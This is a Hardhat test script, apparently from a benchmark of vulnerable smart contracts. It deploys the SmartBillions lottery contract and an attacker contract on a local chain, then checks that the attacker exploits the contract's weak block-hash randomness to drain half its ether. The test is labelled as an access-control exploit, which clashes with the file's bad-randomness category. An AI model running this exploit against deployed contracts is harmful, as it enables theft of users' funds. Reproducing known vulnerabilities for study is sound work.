const { loadFixture, mine } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe('attack bad_randomness/smart_billions.sol', function () {
    async function deployContracts() {

        const SmartBillions = await ethers.getContractFactory('contracts/dataset/bad_randomness/smart_billions.sol:SmartBillions');
        const victim = await SmartBillions.deploy();
        await victim.waitForDeployment();

        const SmartBillionsAttacker = await ethers.getContractFactory('contracts/bad_randomness/smart_billions_attack.sol:SmartBillionsAttacker');
        const attacker = await SmartBillionsAttacker.deploy(victim.target);
        await attacker.waitForDeployment();

    return {victim, attacker};
    }

  
    it('exploit access control vulnerability', async function () {
        const [v, a] = await ethers.getSigners();

        const {victim, attacker} = await loadFixture(deployContracts);
        const amount = ethers.parseEther('10');
        const options = {
            value: amount
        };
        await victim.connect(v).hotStore(options);

        const victimBalanceBefore = await ethers.provider.getBalance(victim.target);
        expect(victimBalanceBefore).to.equal(amount);
        let block = await ethers.provider.getBlockNumber();
        await mine(260 - block - 1);
        block = await ethers.provider.getBlockNumber();
        console.log(block);
        for (let i = 0; i < 64; i++) {
            await victim.connect(v).addHashes(256);
        }

        const minVal = {value: ethers.parseEther('1')};
        let tx = await attacker.connect(a).play(0, minVal);
        let receipt = await tx.wait();
        await mine(260);

        tx = await attacker.won();
        receipt = await tx.wait();

        const victimBalanceAfter = await ethers.provider.getBalance(victim.target);
        const balance = (victimBalanceBefore + minVal.value) / BigInt(2);
        expect(victimBalanceAfter).to.equal(balance);

        const attackerBalance = await ethers.provider.getBalance(attacker.target);
        expect(attackerBalance).to.equal(balance);

    });
  });